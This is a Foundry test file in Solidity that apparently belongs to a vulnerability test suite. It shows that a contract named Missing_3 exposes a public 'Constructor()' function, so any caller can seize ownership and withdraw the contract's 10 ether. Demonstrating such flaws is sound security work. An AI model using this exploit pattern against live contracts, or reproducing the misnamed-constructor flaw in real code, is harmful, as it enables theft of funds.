
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {

    Missing_3 public _contractUnderTest;
    address public deployer;

    function setUp() public {
        deployer = address(0xDEAD);
        vm.prank(deployer);
        _contractUnderTest = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the deployer (who deployed the contract but is NOT the owner due to the bug)
        vm.assume(caller != deployer);

        // --- 2. State Configuration ---
        
        // Fund the contract so there's something to withdraw
        vm.deal(address(_contractUnderTest), 10 ether);

        // --- 3. Execution & Assertion ---
        
        // The vulnerability: Constructor() is a regular public function, not a real constructor.
        // Any arbitrary caller can call it to become the owner.
        vm.prank(caller);
        _contractUnderTest.Constructor();

        // Now the caller should be able to withdraw funds since they became the owner
        uint256 callerBalanceBefore = caller.balance;
        
        vm.prank(caller);
        _contractUnderTest.withdraw();

        // Assert that the caller successfully withdrew the funds
        uint256 callerBalanceAfter = caller.balance;
        assertEq(callerBalanceAfter - callerBalanceBefore, 10 ether, "Caller should have received the contract balance");
        assertEq(address(_contractUnderTest).balance, 0, "Contract balance should be zero after withdrawal");
    }
}
